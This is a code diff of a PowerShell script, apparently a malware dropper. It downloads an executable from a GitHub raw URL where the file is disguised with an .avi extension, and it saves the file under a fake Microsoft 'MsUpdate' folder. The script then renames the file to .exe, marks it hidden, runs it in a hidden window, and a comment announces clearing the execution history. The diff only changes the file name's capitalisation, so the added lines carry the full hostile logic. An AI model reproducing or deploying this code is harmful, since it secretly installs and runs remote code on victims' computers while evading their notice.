@@ -21,13 +21,13 @@ $atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.F
 Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
 
 # Copy Runer
-$rutaLocalRuner = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe"
-$urlRemotoRuner = "https://github.com/emakedie/UCN/raw/refs/heads/main/Mssucn.avi"
+$rutaLocalRuner = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\MssuCN.exe"
+$urlRemotoRuner = "https://github.com/emakedie/UCN/raw/refs/heads/main/MssuCN.avi"
 if (-not (Test-Path $rutaLocalRuner)) {
     Invoke-WebRequest -Uri $urlRemotoRuner -OutFile $rutaLocalRuner
 }
-if ((Get-Item $rutaLocalRuner).Name -ne "Mssucn.exe") {
-    $rutaNuevoNombreRuner = $rutaLocalRuner -replace 'Mssucn.avi', 'Mssucn.exe'
+if ((Get-Item $rutaLocalRuner).Name -ne "MssuCN.exe") {
+    $rutaNuevoNombreRuner = $rutaLocalRuner -replace 'MssuCN.avi', 'MssuCN.exe'
     Rename-Item -Path $rutaLocalRuner -NewName $rutaNuevoNombreRuner
 }
 $atributosOcultosRuner = (Get-Item $rutaLocalRuner).Attributes -bor [System.IO.FileAttributes]::Hidden
@@ -36,7 +36,7 @@ sleep 10
 
 
 ## Execution of the client
-Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe" -WindowStyle Hidden
+Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\MssuCN.exe" -WindowStyle Hidden
 
 sleep 30
 # Limpiar historial de ejecucion
